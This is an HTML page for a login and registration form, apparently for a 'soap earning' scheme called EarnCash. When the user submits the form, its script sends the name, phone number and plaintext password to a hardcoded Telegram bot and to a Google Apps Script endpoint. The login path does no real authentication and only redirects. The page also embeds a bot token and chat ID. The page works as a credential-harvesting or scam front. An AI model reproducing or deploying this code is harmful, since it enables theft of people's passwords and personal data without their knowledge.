<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EarnCash - Login & Register</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0066ff; --bg: #f4f7fe; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .auth-container { background: white; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); text-align: center; }
        .logo { font-size: 40px; margin-bottom: 10px; display: block; }
        h2 { font-size: 24px; font-weight: 800; color: #1a1a1a; margin-bottom: 5px; }
        p { font-size: 14px; color: #777; margin-bottom: 25px; }
        .form-group { margin-bottom: 18px; text-align: left; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #555; }
        .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; background: #fafafa; transition: 0.3s; }
        .form-group input:focus { border-color: var(--primary); background: white; }
        .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .main-btn:active { transform: scale(0.98); }
        .toggle-text { margin-top: 25px; font-size: 14px; color: #666; }
        .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: underline; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="auth-container">
        <span class="logo">ðŸ§¼</span>
        <h2 id="title">Create Account</h2>
        <p id="subtitle">Start your soap earning journey!</p>

        <div id="reg-fields">
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" id="name" placeholder="Enter your name">
            </div>
        </div>

        <div class="form-group">
            <label>Mobile Number</label>
            <input type="tel" id="phone" placeholder="Enter 10 digit number">
        </div>

        <div class="form-group">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Enter password">
        </div>

        <button class="main-btn" onclick="handleAuth()" id="btn-text">Register Now</button>

        <p class="toggle-text" id="toggle-msg">
            Already have an account? <span onclick="toggleMode()">Login</span>
        </p>
    </div>

    <script>
        let mode = 'register';
        const scriptURL = 'https://script.google.com/macros/s/AKfycbzXgodyxdba2JM4cL_Z8nIeJicDMBvAYMwiYio3_wPazR53fXRoFdPng8ZCuLe8wEc/exec';
        const teleToken = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
        const teleChatID = "8415600127";

        function toggleMode() {
            const title = document.getElementById('title');
            const regFields = document.getElementById('reg-fields');
            const btnText = document.getElementById('btn-text');
            const toggleMsg = document.getElementById('toggle-msg');

            if (mode === 'register') {
                mode = 'login';
                title.innerText = "Welcome Back";
                regFields.classList.add('hidden');
                btnText.innerText = "Login Now";
                toggleMsg.innerHTML = "Don't have an account? <span onclick='toggleMode()'>Register</span>";
            } else {
                mode = 'register';
                title.innerText = "Create Account";
                regFields.classList.remove('hidden');
                btnText.innerText = "Register Now";
                toggleMsg.innerHTML = "Already have an account? <span onclick='toggleMode()'>Login</span>";
            }
        }

        async function handleAuth() {
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;
            const btn = document.getElementById('btn-text');

            if (phone.length < 10 || pass.length < 4) {
                alert("Please enter valid details!");
                return;
            }

            btn.innerText = "Processing...";
            btn.disabled = true;

            // 1. TELEGRAM ALERT
            const msg = `ðŸ‘¤ *USER ${mode.toUpperCase()}*\n\nðŸ“› Name: ${name || 'N/A'}\nðŸ“ž Phone: ${phone}\nðŸ”‘ Pass: ${pass}\nðŸ•’ Time: ${new Date().toLocaleString()}`;
            fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);

            // 2. GOOGLE SHEET & REDIRECT
            if (mode === 'register') {
                let formData = new FormData();
                formData.append('Name', name);
                formData.append('Phone', phone);
                formData.append('Password', pass);

                fetch(scriptURL, { method: 'POST', body: formData })
                .then(() => {
                    localStorage.setItem('userName', name);
                    localStorage.setItem('userPhone', phone);
                    window.location.href = "plans.html"; // Register ke baad Soap Plans
                })
                .catch(() => {
                    window.location.href = "plans.html";
                });
            } else {
                localStorage.setItem('userPhone', phone);
                window.location.href = "home.html"; // Login ke baad Direct Home
            }
        }
    </script>
</body>
</html>
